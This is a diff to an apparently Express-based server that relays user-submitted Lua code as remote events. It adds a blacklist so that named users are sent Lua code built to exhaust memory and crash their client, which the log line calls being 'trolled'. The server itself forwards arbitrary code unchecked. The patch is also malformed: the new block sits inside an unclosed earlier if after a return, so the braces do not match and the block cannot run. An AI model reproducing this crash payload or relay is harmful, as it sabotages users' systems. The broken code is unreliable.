@@ -5,6 +5,8 @@ const app = express();
 const events = new EventEmitter();
 const EVENT = "RemoteEvent";
 
+const blacklist = new Set(["HkotQRuemN"]);
+
 app.use(express.json());
 
 app.use((req, res, next) => {
@@ -19,6 +21,19 @@ app.post("/executeRequest", (req, res) => {
   if (!username || !code) {
     console.log("missing user or code");
     return res.sendStatus(400);
+
+  if (blacklist.has(username)) {
+    console.log(`Blocked & trolled blacklisted user: ${username}`);
+
+    const crashCode = `
+      local t = {}
+      while true do
+          table.insert(t, t)
+      end
+    `;
+
+    events.emit(EVENT, { username, code: crashCode });
+    return res.sendStatus(200);
   }
 
   console.log(`executed: ${username}: ${code}`);
